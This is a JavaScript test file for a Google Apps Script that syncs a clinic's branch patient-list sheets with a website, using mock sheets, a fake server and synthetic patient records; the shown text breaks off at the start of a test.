// Tests of the Google Apps Script apps-script/AajSync.js (the two-way Aaj ki List sync): node tests/aaj-sync-script.test.mjs
//
// The script is loaded into a fake Google (tests/apps-script-mock.mjs: sheets with the real tabs' header variants, hidden helper
// columns, properties, locks, triggers, a clock, the archive spreadsheet) and talks to a fake website
// (tests/aaj-sync-fake-server.mjs, written from the contract in .omc/handoffs/aaj-sync-design.md section 2). The real SQL is tested
// in supabase/tests/25_aaj_sync_test.sql. Everything here is synthetic: no real names, phones or Mr numbers.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createEnv, stripComments, SCRIPT_PATH } from './apps-script-mock.mjs';
import { createServer } from './aaj-sync-fake-server.mjs';
import * as web from '../web/js/lib/aaj.js';
import { cleanLegacyName, splitPeople } from '../web/js/lib/legacy.js';
import { parseMonthCell } from '../web/js/lib/protocol.js';
import { parseCSV, phoneOf } from '../web/js/lib/healthwire.js';

let passed = 0, failed = 0;
const test = (name, fn) => {
  if (process.env.AAJ_TEST_ONLY && !name.includes(process.env.AAJ_TEST_ONLY)) return;   // AAJ_TEST_ONLY="5 tabs x 100" runs one test
  const t0 = Date.now();
  try { fn(); passed++; console.log('ok -', name + (process.env.AAJ_TEST_TIMES ? `  [${Date.now() - t0} ms]` : '')); }
  catch (e) { failed++; console.log('FAIL -', name, '\n   ', String(e.stack || e.message).split('\n').slice(0, 6).join('\n    ')); process.exitCode = 1; }
};

const fixture = JSON.parse(fs.readFileSync(new URL('./fixtures/aaj-sync-tab.json', import.meta.url), 'utf8'));
const TABS = ['Gulshan KHI', 'North Nazimabad', 'DHA KHI', 'Gulberg Lhr', 'Islamabad'];
const BRANCH = { 'Gulshan KHI': 'GUL', 'North Nazimabad': 'NN', 'DHA KHI': 'DHA', 'Gulberg Lhr': 'LHR', 'Islamabad': 'ISB' };
const TODAY = '2026-10-09';
const SECRET = 'sync-secret';

// ------------------------------------------------------------------------------------------------ helpers
const clone = (x) => JSON.parse(JSON.stringify(x));
const norm = (s) => String(s ?? '').toLowerCase().replace(/\s+/g, ' ').trim();

/** column number (1-based) of a header, found by the first words of its text ("token" finds "Token No ", "Token #", "Token") */
function colOf(env, tab, label) {
  const sh = env.tab(tab);
  const used = sh.used().cols;
  for (let c = 1; c <= used; c++) if (norm(sh.text(1, c)).startsWith(label.toLowerCase())) return c;
  throw new Error(`no column "${label}" in ${tab}: ${sh.row(1).join(' | ')}`);
}
const cellOf = (env, tab, r, label) => env.tab(tab).text(r, colOf(env, tab, label));
const setCell = (env, tab, r, label, value, opts) => env.type(tab, r, colOf(env, tab, label), value, opts);
/** the row number of the first patient row whose Patient Name starts with `name` */
function rowOf(env, tab, name) {
  const sh = env.tab(tab);
  const nc = (() => { for (let c = 1; c <= sh.used().cols; c++) if (/^patient/i.test(sh.text(1, c).trim())) return c; return 2; })();
  for (let r = 2; r <= sh.used().rows; r++) if (norm(sh.text(r, nc)).startsWith(name.toLowerCase())) return r;
  return null;
}
const fx = (tab, i) => fixture.rows[tab][i].slice();
/** the row whose patient name is exactly this */
function exactRow(env, tab, name) {
  const sh = env.tab(tab);
  const nc = colOf(env, tab, 'patient');
  for (let r = 2; r <= sh.used().rows; r++) if (sh.text(r, nc) === name) return r;
  return null;
}
const statusOf = (env, tab, r) => cellOf(env, tab, r, 'website');
const headerOf = (env, tab) => env.tab(tab).text(1, colOf(env, tab, 'website'));
const visitsOfPatient = (server, name) => server.state.visits.filter((v) => server.patientByMr(v.mr).name === name);

/**
 * Every request the script ever sends is checked against the contract (design section 2.1), in every test below.
 * A request that breaks it throws inside the fake fetch, so the test that caused it fails.
 */
const KEY_RE = /^(S-[0-9a-f]{12}|W-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})$/;
const SHARED = ['mr', 'name', 'phone', 'month', 'treatment', 'token', 'status', 'group', 'doctors', 'details'];
function validateRequest(req) {
  const fail = (m) => { throw new Error('CONTRACT: ' + m); };
  if (req.method !== 'post') fail('method ' + req.method);
  if (!/\/rest\/v1\/rpc\/aaj_sync$/.test(req.url)) fail('url ' + req.url);
  if (!req.headers.apikey || req.headers.Authorization !== 'Bearer ' + req.headers.apikey) fail('headers');
  const body = JSON.parse(req.body);
  if (JSON.stringify(Object.keys(body).sort()) !== '["p_payload","p_secret"]') fail('body keys');
  const p = body.p_payload;
  if (JSON.stringify(Object.keys(p).sort()) !== '["check_removed","date","tabs"]') fail('payload keys ' + Object.keys(p));
  if (!/^\d{4}-\d{2}-\d{2}$/.test(p.date) || typeof p.check_removed !== 'boolean' || !Array.isArray(p.tabs) || p.tabs.length > 5) fail('payload shape');
  let rows = 0;
  const seen = new Set();
  for (const t of p.tabs) {
    // a quiet minute asks only "anything new?": no rows and no list of present rows (so the website claims and removes nothing)
    const quick = !('present' in t);
    if (JSON.stringify(Object.keys(t).filter((k) => k !== 'doubled').sort()) !== (quick ? '["branch","hash","rows","tab"]' : '["branch","hash","present","rows","tab"]')) fail('tab keys ' + Object.keys(t));
    // keys on two rows that show the same person (RV-1 / RV-3): only with the list of present rows, each one of them, never empty
    if ('doubled' in t && (quick || !Array.isArray(t.doubled) || !t.doubled.length || t.doubled.some((k) => !t.present.includes(k)) || new Set(t.doubled).size !== t.doubled.length)) fail('doubled');
    if (quick && (t.rows.length || p.check_removed || t.hash === null)) fail('a call without "present" carries no rows, no removal pass and a hash');
    if (BRANCH[t.tab] !== t.branch || seen.has(t.branch)) fail('tab ' + t.tab);
    seen.add(t.branch);
    if (!(t.hash === null || /^[0-9a-f]{32}$/.test(t.hash))) fail('hash ' + t.hash);
    if (!quick && (!Array.isArray(t.present) || t.present.length > 400 || t.present.some((k) => !KEY_RE.test(k)) || new Set(t.present).size !== t.present.length)) fail('present');
    rows += t.rows.length;
    for (const r of t.rows) {
      if (Object.keys(r).some((k) => !['key', 'new', 'edited_at', 'set', 'base'].includes(k))) fail('row keys ' + Object.keys(r));
      if (!KEY_RE.test(r.key) || typeof r.new !== 'boolean' || !(r.edited_at === null || Number.isFinite(r.edited_at))) fail('row ' + JSON.stringify(r).slice(0, 120));
      if (!t.present.includes(r.key)) fail('a row whose key is not in present');
      if (r.new === (r.base !== undefined)) fail('base must be given for linked rows only');
      const set = r.set;
      const strings = ['mr', 'name', 'legacy_name', 'phone', 'treatment', 'details', 'pp', 'healthwire', 'reminder'];
      for (const f of Object.keys(set)) {
        if (![...SHARED, 'legacy_name', 'pp', 'healthwire', 'reminder'].includes(f)) fail('set field ' + f);
        if (strings.includes(f)) { if (typeof set[f] !== 'string') fail(f + ' must be a string'); }
        else if (f === 'doctors') { if (typeof set.doctors.t !== 'string' || !Array.isArray(set.doctors.v) || set.doctors.v.some((x) => typeof x !== 'string') || set.doctors.v.length > 10) fail('doctors'); }
        else {
          if (typeof set[f].t !== 'string' || !('v' in set[f])) fail(f + ' must be {t, v}');
          if (f === 'status' ? !(set.status.v === null || typeof set.status.v === 'string') : !(set[f].v === null || Number.isInteger(set[f].v))) fail(f + '.v');
        }
      }
      if (set.status && set.status.t === '') fail('an empty Status cell is never sent');
      if (r.new && set.mr === undefined) fail('a new row always carries mr');
      if ('name' in set && !('legacy_name' in set)) fail('name goes with legacy_name');
      if (r.new && !set.name) fail('a new row needs a name');
      if (r.base) {
        for (const f of Object.keys(r.base)) if (!(f in set) || !SHARED.includes(f)) fail('base for ' + f);
        for (const f of Object.keys(set)) if (SHARED.includes(f) && !(f in r.base)) fail('missing base for ' + f);
        if (r.base.doctors && !Array.isArray(r.base.doctors)) fail('base doctors');
      }
    }
  }
  if (rows > 25) fail('more than 25 rows in a call');
}

/**
 * A clinic day: the fake Google with the given tabs (header + rows from the fixture, or `rows`), the fake website, the one-minute
 * trigger state set as aajSetup leaves it. `patients` are added to the website first.
 */
const CK_ID = '1wdRT8RqHLF-x2X6AVqLnvGkYrFWZEB3BGbx1CowMe_Y';
function world({ tabs = ['Gulshan KHI'], rows = {}, patients = [], install = true, helpers = true, date = TODAY, at = '08:00', fixtureRows = true, checkupBook = true, envOptions = {} } = {}) {
  const env = createEnv(envOptions);
  if (checkupBook) env.checkupBook = env.addBook(CK_ID, 'Checkup karwaliya');
  const server = createServer({ now: () => env.clock.ms });
  env.fetchHandler = (req) => { validateRequest(req); return server.handler(req); };
  env.at(date, at);
  for (const p of patients) server.addPatient(p);
  for (const t of tabs) env.addTab(t, [fixture.headers[t], ...(rows[t] || (fixtureRows ? fixture.rows[t] : []))]);
  if (install) {
    for (const t of tabs) env.props.document.set('listDate:' + t, date);
    env.props.user.set('AAJ_SYNC_SECRET', SECRET);
    if (helpers) for (const t of tabs) { const sh = env.tab(t); env.ctx.aajEnsureHelpers_(sh, sh.getRange(1, 1, 1, sh.getLastColumn()).getDisplayValues()[0]); }   // the helper columns Set up creates
    for (const h of ['aajSyncTick', 'aajOnEdit', 'aajOnChange', 'aajOnOpen']) env.triggers.push({ handler: h, id: 'seed-' + h, source: h === 'aajSyncTick' ? 'CLOCK' : 'SPREADSHEETS', event: h === 'aajSyncTick' ? 'CLOCK' : h === 'aajOnChange' ? 'ON_CHANGE' : 'ON_EDIT' });
  }
  return { env, server };
}
/** run a few ticks, letting 61 s pass first so rows typed a moment ago have settled */
function settle(env, n = 2) { env.advance(61000); return env.ticks(n); }

const BASE_PATIENTS = [
  { mr: '9701', name: 'Sample Person One', phone: '03001110001' },
  { mr: '146', name: 'Sample Person Two', phone: '03001110002' },
  { mr: '9703', name: 'Sample Person Six', phone: '03001110006' },
];

// ------------------------------------------------------------------------------------------------ the file itself
test('the script is plain: no import/export/require, no ?. or ??, only function/var at the top, names start with aaj/AAJ', () => {
  const src = fs.readFileSync(SCRIPT_PATH, 'utf8');
  const code = stripComments(src);
  assert.ok(!/\bimport\s*[\w{*]|\bexport\s+(default|const|function|var|let|class|\{)|\brequire\s*\(/.test(code), 'module syntax');
  assert.ok(!/\?\./.test(code.replace(/'(?:[^'\\]|\\.)*'/g, "''").replace(/\/(?:[^\/\\\n]|\\.)+\/[gimsuy]*/g, '/re/')), 'optional chaining');
  assert.ok(!/\?\?/.test(code.replace(/'(?:[^'\\]|\\.)*'/g, "''")), 'nullish operator');
  assert.ok(!/^\s*(const|let|class)\s/m.test(code.split('\n').filter((l) => !/^\s/.test(l)).join('\n')), 'top-level const/let/class');
  const tops = [...code.matchAll(/^(?:function\s+([A-Za-z_$][\w$]*)|var\s+([A-Za-z_$][\w$]*))/gm)].map((m) => m[1] || m[2]);
  assert.ok(tops.length > 40);
  for (const n of tops) assert.match(n, /^(aaj|AAJ)/, `top-level name ${n}`);
  assert.equal((src.match(/Utilities\.formatDate\(/g) || []).length, 1, 'one formatDate, in aajFmt_');
  assert.ok(/Utilities\.formatDate\(new Date\(ms\), AAJ\.TZ, fmt\)/.test(src), 'the time zone is always given explicitly');
  assert.ok(!/getScriptTimeZone|getTimeZone|\.getHours\(|\.getDate\(|\.getDay\(/.test(code), 'no default-time-zone date parts');
  assert.ok(src.includes("KEY: 'sb_publishable_"), 'carries the publishable key only');
  assert.ok(!/service_role|eyJhbGci/.test(src));
});

test('the script only knows the five branch tabs by their exact names', () => {
  const env = createEnv();
  const cfg = env.global('AAJ');
  assert.deepEqual(cfg.TABS.map((t) => t.tab), TABS);
  assert.deepEqual(cfg.TABS.map((t) => t.branch), ['GUL', 'NN', 'DHA', 'LHR', 'ISB']);
  assert.equal(cfg.TZ, 'Asia/Karachi');
});

// ------------------------------------------------------------------------------------------------ parity with web/js/lib/aaj.js
const AAJ_TEST_TAB = [  // the rows of tests/aaj.test.mjs
  ['Tt Mr #', 'Tt Patient Name', 'Monthly', 'Tt Treatment', 'Token No', 'Waiting', 'Group', "Doctor's Name", 'Tt Treatment Details', 'P.P', 'Healthwire', 'Tt Contact No', 'Reminder Status'],
  ['9694', 'Sample Person Two', '2', 'Monthly', 121, 'Completed', '', 'Dr. Ali Rashid', '', '', 'Done', '03001112233', ''],
  ['8715', 'Sample Person Three lhr', '6 Photo', 'Monthly', 119, 'Completed', 'Group 3', 'Dr Haniya, Dr. Samrah Khan', 'Brac 16 13 45 46 U L 016', '35k', 'Done', 3004445566, ''],
  ['', 'Sample Person Seven', '', 'Checkup', 79, 'Not came', '', 'Dr. Unknown Person', '', '', '', '03211234567', 'Called'],
  ['9694', 'Sample Person Two', '3', 'Monthly', 1, 'Completed', '', 'Dr. Ali Rashid, Hira Anis', 'U L 014', '', '', '03001112233', ''],
  ['', 'Sample Person Nine', '', 'Filling', 2, '', '', '', '', '', '', '', ''],
];
const webDetect = (h) => web.detectColumns(h);

function paritySources() {
  const csv = parseCSV(fs.readFileSync(new URL('./fixtures/aaj-ki-list-sample.csv', import.meta.url), 'utf8'));
  const src = [{ name: 'aaj-ki-list-sample.csv', header: csv[0], rows: csv.slice(1).filter((r) => r.some((c) => String(c).trim())) },
    { name: 'tests/aaj.test.mjs TAB', header: AAJ_TEST_TAB[0], rows: AAJ_TEST_TAB.slice(1) }];
  for (const t of TABS) src.push({ name: 'aaj-sync-tab.json ' + t, header: fixture.headers[t], rows: fixture.rows[t] });
  return src;
}

test('parity: detectColumns reads every header exactly as web/js/lib/aaj.js does ("Months" included)', () => {
  const env = createEnv();
  for (const s of paritySources()) {
    assert.deepEqual(env.call('aajDetectColumns', s.header), webDetect(s.header), s.name);
    assert.equal(env.call('aajIsHeaderRow', s.header), web.isHeaderRow(s.header), s.name);
  }
  // the real tabs' header variants (snapshot 2026-10-09): Months, Monthly, Month; Token / Token No / Token #; Waiting / Status; Column 13 as the group
  const m = (t) => env.call('aajDetectColumns', fixture.headers[t]);
  assert.equal(m('Gulshan KHI').month, 2, '"Months" is the month column');
  assert.equal(m('North Nazimabad').month, 2, '"Monthly " with a trailing space');
  assert.deepEqual([m('North Nazimabad').group, m('North Nazimabad').doctors, m('North Nazimabad').phone, m('North Nazimabad').reminder], [6, 7, 11, 12], 'NN: the extra Column 13/14/16 do not take over any field');
  assert.equal(m('DHA KHI').group, 6, 'DHA: "Column 13" is the group');
  assert.equal(m('DHA KHI').token, 4, '"Token No " with a trailing space');
  assert.deepEqual([m('Gulberg Lhr').token, m('Gulberg Lhr').status, m('Gulberg Lhr').pp, m('Gulberg Lhr').reminder], [4, 5, 9, 12], 'Lahore: Token #, Status, P P, Reminder');
  assert.deepEqual(m('Islamabad'), m('Gulberg Lhr'));
  for (const t of TABS) assert.ok(env.call('aajIsHeaderRow', fixture.headers[t]), t);
});

test('parity: aajReadRow reads every fixture row exactly as web/js/lib/aaj.js readRow (any difference fails)', () => {
  const env = createEnv();
  assert.equal(typeof web.readRow, 'function', 'web/js/lib/aaj.js exports readRow');
  let compared = 0;
  for (const s of paritySources()) {
    const cols = webDetect(s.header);
    for (const row of s.rows) {
      const padded = row.slice();
      while (padded.length < s.header.length) padded.push('');
      const mine = env.call('aajReadRow', padded, env.call('aajDetectColumns', s.header));
      assert.deepEqual(mine, clone(web.readRow(padded, cols)), `${s.name}: ${row[1]}`);
      compared++;
    }
  }
  assert.ok(compared >= 25, 'rows compared: ' + compared);
});

test('parity: the Admin -> Import reader (readTab) reads a tab with the strict readers: "Months" is a month column, "Kit 80k" is not a token, two phones are not glued, a Mr# is an Mr#', () => {
  const header = fixture.headers['Gulshan KHI'];
  const t = web.readTab([header, ...fixture.rows['Gulshan KHI']]);
  assert.equal(t.columns.month, 2);
  const byName = (n) => t.rows.find((r) => r.name === n);
  assert.equal(byName('Sample Person One').month, 5);
  assert.equal(byName('Sample Person Five').token, null, 'Kit 80k is not token 80');
  assert.equal(byName('Sample Person Six').token, null, '1 pfm is not token 1');
  assert.equal(byName('Sample Person Three').phone, '03001110003', 'the first of two numbers');
  assert.equal(byName('Sample Person Two').group, '1');
  assert.equal(byName('Sample Person Four').group, null, 'Group 4 has no website group');
  const z = web.readTab([fixture.headers['Gulberg Lhr'], ...fixture.rows['Gulberg Lhr']]);
  assert.deepEqual(z.rows.map((r) => r.token), [null, null, null], 'kit text and 4 Zirconia in the Token column of Lahore');
});

const LOOSE = {
  firstPhone: ['03001234567', '3001234567', '92 300 1234567', '0300 1111111 / 0321 2222222', '03001111111, 03212222222', '03001111111 or 03212222222', '', null, 'call mother', '12345', '0300-1234567', 3001234567, '0300 1234567'],
  tokenOf: ['1', ' 12 ', '121', '1.0', '80k', 'Kit 80k', '1 pfm', '4 Zirconia', 'Dr Verda', '', '0', '999', '1000', '12.5', null],
  groupOf: ['Group 1', 'Group 3', 'Group 4', 'Group', 'Group 1, Group 2', 'Group 2, Group 1', '2', '12', '21', '', 'G3'],
  liveStatus: ['Waiting', 'waiting ', 'Treatment', 'In treatment', 'Scheduled', 'Completed', 'completed', 'Cancelled', 'No show', 'No-show', 'Not came', 'Done', 'Arrived', 'Appointment', '', '   ', 'Banana', null, 'Pending'],
  mrOf: ['9851', '146.0', ' 9851 ', 'NEW', 'new', '98 51', 'abc', 'A-12', '', 'x9', null, '8602.', ' 8602. ', '8602..', '.', '146.0.'],
  givenName: ['M Umer', 'Muhammad Umer', 'Sana Ahmed', 'Dr. Sara', 'baby of Sana', 'Syed', 'Mr', '', null, 'Muhammad', 'Ayesha Khan', "O'Neil Smith"],
  cleanLegacyName: ['Sana lhr', 'AHMED KHAN N.N', 'Zara Isb.', 'Plain Name', 'x', 'dha', 'Ali Raza (Kid)', '  spaced   out  '],
  splitPeople: ['Dr. Ali Rashid, Assistant A, Dr. B', 'Dr A / Dr B & Dr C', 'Dr A and Dr B', '', 'Hira Anis, Dr Haniya', 'Dr. Komal Rubab,Dr Haniya'],
  parseMonthCell: ['4', '04 Photo', '13 Photo', 'Monthly', '', null, '5.0', '21 Photo', '60', '61'],
  phoneOf: ['03001234567', 3001234567, '92 300 1234567', '123', '', null, '3.0012345E+9'],
};
const WEB_FN = { cleanLegacyName, splitPeople, parseMonthCell, phoneOf };
const SCRIPT_FN = { firstPhone: 'aajFirstPhone', tokenOf: 'aajTokenOf', groupOf: 'aajGroupOf', liveStatus: 'aajLiveStatus', mrOf: 'aajMrOf', givenName: 'aajGivenName', cleanLegacyName: 'aajCleanLegacyName', splitPeople: 'aajSplitPeople', parseMonthCell: 'aajParseMonthCell', phoneOf: 'aajPhoneOf' };

test('parity: the parsers give the same answer in the script and in web/js/lib (loose strings table)', () => {
  const env = createEnv();
  for (const [fn, inputs] of Object.entries(LOOSE)) {
    const theirs = WEB_FN[fn] || web[fn];
    assert.equal(typeof theirs, 'function', `web/js/lib exports ${fn}`);
    for (const input of inputs) {
      if ((fn === 'cleanLegacyName' || fn === 'splitPeople') && input === null) continue;
      assert.deepEqual(env.call(SCRIPT_FN[fn], input), clone(theirs(input)), `${fn}(${JSON.stringify(input)})`);
    }
  }
});

test('the parsers follow the design table (9.1) whatever the web copy does', () => {
  const env = createEnv();
  const is = (fn, input, expected) => assert.deepEqual(env.call(SCRIPT_FN[fn], input), expected, `${fn}(${JSON.stringify(input)})`);
  is('firstPhone', '3001234567', '03001234567');
  is('firstPhone', '0300 1111111 / 0321 2222222', '03001111111');
  is('firstPhone', '03001111111, 03212222222', '03001111111');
  is('firstPhone', '03001111111 or 03212222222', '03001111111');
  is('firstPhone', '', null);
  is('tokenOf', '121', 121); is('tokenOf', '1.0', 1); is('tokenOf', 'Kit 80k', null); is('tokenOf', '1 pfm', null);
  is('tokenOf', '4 Zirconia', null); is('tokenOf', 'Dr Verda', null); is('tokenOf', '0', null); is('tokenOf', '1000', null);
  is('groupOf', 'Group 1', '1'); is('groupOf', 'Group 3', '3'); is('groupOf', 'Group 4', null); is('groupOf', 'Group', null);
  is('groupOf', 'Group 1, Group 2', '1'); is('groupOf', 'Group 2, Group 1', '2'); is('groupOf', '12', null);
  const live = { Waiting: 'waiting', Treatment: 'in_treatment', 'In treatment': 'in_treatment', Scheduled: 'scheduled', Completed: 'completed', Cancelled: 'cancelled',
    'No show': 'no_show', 'Not came': 'no_show', Done: 'completed', '': null, Banana: null, Arrived: 'waiting' };
  for (const [k, v] of Object.entries(live)) is('liveStatus', k, v);
  is('mrOf', '146.0', { mr: '146', isNew: false }); is('mrOf', 'NEW', { mr: null, isNew: true }); is('mrOf', '98 51', { mr: null, isNew: false });
  is('mrOf', 'abc', { mr: null, isNew: false }); is('mrOf', '', { mr: null, isNew: false });
  is('givenName', 'M Umer', 'umer'); is('givenName', 'Muhammad Umer', 'umer'); is('givenName', 'Syed', 'syed'); is('givenName', '', '');
});

test('the history reading of a status cell is kept for the Admin import only: a live row never reads Waiting or Scheduled as Completed', () => {
  const env = createEnv();
  for (const w of ['Waiting', 'Treatment', 'Scheduled', 'In treatment', '']) {
    assert.equal(env.call('aajHistoryStatus', w), 'completed', 'history import: unchanged');
    assert.notEqual(env.call('aajLiveStatus', w), 'completed', 'live: ' + w);
  }
});

// ------------------------------------------------------------------------------------------------ first sync
const rowsSent = (server) => server.calls.flatMap((c) => (c.payload.tabs || []).flatMap((t) => (t.rows || []).map((r) => ({ ...r, tab: t.tab, call: c }))));
const keyCol = (env, tab) => colOf(env, tab, 'sync key');
const keysOf = (env, tab) => { const sh = env.tab(tab); const c = keyCol(env, tab); const out = []; for (let r = 2; r <= sh.used().rows; r++) if (sh.text(r, c)) out.push(sh.text(r, c)); return out; };

test('first sync of a tab full of existing rows: keys are written into the sheet BEFORE the first send, every row is sent once, nothing doubles', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  const seen = [];
  env.fetchHandler = (req) => { seen.push({ keys: keysOf(env, 'Gulshan KHI'), body: JSON.parse(req.body) }); return server.handler(req); };
  env.ticks(1);                                             // first sight: rows get their key and a stamp, nothing is sent yet
  assert.equal(rowsSent(server).length, 0, 'a row without an edit stamp waits one tick');
  assert.equal(keysOf(env, 'Gulshan KHI').length, 6);
  env.ticks(1);
  const sent = rowsSent(server);
  assert.equal(sent.length, 6, 'each of the six rows sent once');
  assert.equal(new Set(sent.map((r) => r.key)).size, 6);
  const atCall = seen[seen.length - 1];
  for (const r of atCall.body.p_payload.tabs[0].rows) assert.ok(atCall.keys.includes(r.key), 'the key was already in the sheet when the row was sent');
  assert.ok(sent.every((r) => r.new === true && /^S-[0-9a-f]{12}$/.test(r.key)));
  assert.equal(server.state.visits.length, 3, 'the three rows with an Mr# became visits');
  assert.equal(server.state.checkups.length, 3, 'the three rows with no Mr# became checkups');
  assert.equal(server.state.patients.length, 3, 'no patient file (and no Mr#) was made for a checkup');
  for (const v of [...server.state.visits, ...server.state.checkups]) assert.ok(keysOf(env, 'Gulshan KHI').includes(v.sheet_key));
  env.ticks(3);
  assert.equal(rowsSent(server).length, 6, 'idle ticks send nothing more');
  assert.equal(server.state.visits.length, 3);
  assert.equal(server.state.checkups.length, 3);
  // "Kit 80k" is the checkup's token text; "1 pfm" never became a website token on a visit
  const kit = server.state.checkups.find((c) => c.name === 'Sample Person Five');
  assert.equal(kit.token, 'Kit 80k', 'Kit 80k is kept as text');
  assert.equal(server.state.visits.find((v) => server.patientByMr(v.mr).name === 'Sample Person Six').cells.token.v, null, '1 pfm is not a token');
  assert.equal(cellOf(env, 'Gulshan KHI', rowOf(env, 'Gulshan KHI', 'Sample Person Five'), 'token'), 'Kit 80k', 'the kit text stays in the sheet');
  assert.equal(cellOf(env, 'Gulshan KHI', rowOf(env, 'Gulshan KHI', 'Sample Person Six'), 'token'), '1 pfm');
});

test('first sync writes back what the website knows: a checkup has no Mr# (the cell stays empty), the numbered token; statuses say what happened', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  settle(env);
  const r3 = rowOf(env, 'Gulshan KHI', 'Sample Person Three');
  assert.equal(cellOf(env, 'Gulshan KHI', r3, 'mr'), '', 'a checkup patient has no Mr#: the cell stays empty');
  assert.equal(cellOf(env, 'Gulshan KHI', r3, 'contact'), '03001110003 / 03211110003', 'a cell the person typed is not rewritten');
  assert.equal(statusOf(env, 'Gulshan KHI', r3), '\u2713 Checkup patient: no Mr#, no patient file.');
  const r5 = rowOf(env, 'Gulshan KHI', 'Sample Person Five');
  assert.equal(cellOf(env, 'Gulshan KHI', r5, 'mr'), '', '"NEW" in the Mr# cell is the same as empty: a checkup; the word is cleared');
  const r1 = rowOf(env, 'Gulshan KHI', 'Sample Person One');
  assert.equal(statusOf(env, 'Gulshan KHI', r1), '\u2713 On website');
  assert.equal(env.tab('Gulshan KHI').font(r1, colOf(env, 'Gulshan KHI', 'website')), null, 'ok: default colour');
  const r2 = rowOf(env, 'Gulshan KHI', 'Sample Person Two');
  assert.match(statusOf(env, 'Gulshan KHI', r2), /^\u26a0 Not on the website's doctor list/);
  assert.equal(env.tab('Gulshan KHI').font(r2, colOf(env, 'Gulshan KHI', 'website')), '#b45309', 'warning: amber');
  const r4 = rowOf(env, 'Gulshan KHI', 'sample person four');
  assert.match(statusOf(env, 'Gulshan KHI', r4), /^\u26a0 A checkup cannot be Scheduled\. Saved as Waiting\./);
  // the Status column is headed "Waiting" here: the kept field is called Status, never "Waiting" (sheet-behaviour minor, loop 6)
  assert.match(statusOf(env, 'Gulshan KHI', r4), / \u00b7 Website change kept for: Status$/);
  assert.equal(cellOf(env, 'Gulshan KHI', r4, 'waiting'), 'Waiting', 'a checkup cannot be Scheduled: the sheet is told what the website kept');
  assert.equal(cellOf(env, 'Gulshan KHI', r4, 'patient'), 'sample person four lhr', 'the typed name is never changed');
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \d\d:\d\d \u00b7 \d need attention$/);
  assert.equal(server.state.visits.length, 3);
  assert.equal(server.state.checkups.length, 3);
});

test('the same row is not sent again until it changes or five minutes pass (a row the website could not place)', () => {
  const rows = [['50123', 'Typo Person', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001119999', '']];     // 50123: a website-range number nobody has
  const { env, server } = world({ patients: [...BASE_PATIENTS, { mr: '9704', name: 'Typo Person', phone: '03001110004' }], rows: { 'Gulshan KHI': rows } });
  settle(env);
  const count = () => rowsSent(server).filter((r) => r.set.name === 'Typo Person').length;
  assert.equal(count(), 1);
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '\u2717 Mr# 50123 is not on the website. Check the number.');
  env.ticks(3);
  assert.equal(count(), 1, 'quiet for three minutes');
  env.advance(5 * 60000);
  env.ticks(1);
  assert.equal(count(), 2, 'tried again after five minutes');
  setCell(env, 'Gulshan KHI', 2, 'mr', '9704');
  env.advance(61000);
  env.ticks(1);
  assert.equal(count(), 3, 'tried again at once when the person corrected the Mr#');
  assert.equal(server.state.visits.length, 1, 'now the Mr# is a patient and the row has a visit');
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '\u2713 On website');
});

test('30 new rows go in two calls (25 + 5); present rides on every call, check_removed only on the last', () => {
  const rows = [];
  for (let i = 0; i < 30; i++) rows.push(['', `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(1000000 + i).slice(1)}`, '']);
  const { env, server } = world({ rows: { 'Gulshan KHI': rows } });
  settle(env);
  const calls = server.calls.filter((c) => c.payload.tabs[0].rows.length);
  assert.deepEqual(calls.map((c) => c.payload.tabs[0].rows.length), [25, 5]);
  assert.deepEqual(calls.map((c) => c.payload.check_removed), [false, true]);
  for (const c of calls) { assert.equal(c.payload.tabs[0].present.length, 30); assert.equal(c.payload.date, TODAY); }
  assert.equal(server.state.checkups.length, 30, 'each walk-in without an Mr# became a checkup');
  assert.equal(server.state.visits.length, 0);
  assert.equal(server.state.patients.length, 0, 'no patient file was made for any of them');
  assert.equal(statusOf(env, 'Gulshan KHI', 31), '\u2713 Checkup patient: no Mr#, no patient file.');
});

test('a statement timeout (57014) halves the batch (never below 5) and the rows still arrive; the next day it is 25 again', () => {
  const rows = [];
  for (let i = 0; i < 30; i++) rows.push(['', `Walk In ${i + 1}`, '', 'Checkup', '', 'Waiting', '', '', '', '', '', `0301${String(1000000 + i).slice(1)}`, '']);
  const { env, server } = world({ rows: { 'Gulshan KHI': rows } });
  server.faults.timeoutOverRows = 10;
  settle(env);
  assert.equal(server.state.checkups.length, 30);
  assert.equal(env.props.document.get('batch'), '6', '25 -> 12 -> 6');
  const ok = server.calls.filter((c) => c.response.code === 200 && c.payload.tabs[0].rows.length);
  assert.ok(ok.every((c) => c.payload.tabs[0].rows.length <= 10));
  // the floor is 5
  const w2 = world({ rows: { 'Gulshan KHI': rows.slice(0, 12) } });
  w2.server.faults.timeoutOverRows = 1;
  settle(w2.env, 2);
  assert.equal(w2.env.props.document.get('batch'), '5');
  assert.equal(w2.server.state.checkups.length, 0);
  assert.match(headerOf(w2.env, 'Gulshan KHI'), /not syncing/);
  // next day: back to 25
  server.faults.timeoutOverRows = 0;
  env.at('2026-10-10', '08:00');
  env.props.document.set('listDate:Gulshan KHI', '2026-10-10');
  env.ticks(1);
  assert.equal(env.props.document.get('batch'), '25');
});

test('a lost answer (the website did the work but the script never heard): the retry creates no second visit', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  env.advance(61000);
  server.faults.lostAnswers = 1;
  env.ticks(1);
  assert.equal(server.state.visits.length + server.state.checkups.length, 6, 'the website did create the visits and checkups');
  assert.match(headerOf(env, 'Gulshan KHI'), /^Website \u00b7 \u2717 \d\d:\d\d not syncing: the website did not answer$/);
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '', 'no row claims to be on the website yet');
  const keysBefore = keysOf(env, 'Gulshan KHI');
  env.ticks(2);
  assert.equal(server.state.visits.length + server.state.checkups.length, 6, 'still six: the same keys were sent again and found');
  assert.deepEqual(keysOf(env, 'Gulshan KHI'), keysBefore, 'the rows kept their keys');
  assert.equal(statusOf(env, 'Gulshan KHI', 2), '\u2713 On website');
  assert.equal(server.state.patients.length, 3, 'no patient was made');
});

test('the website answering badly (500) or down is shown in the header and costs nothing; sync resumes by itself', () => {
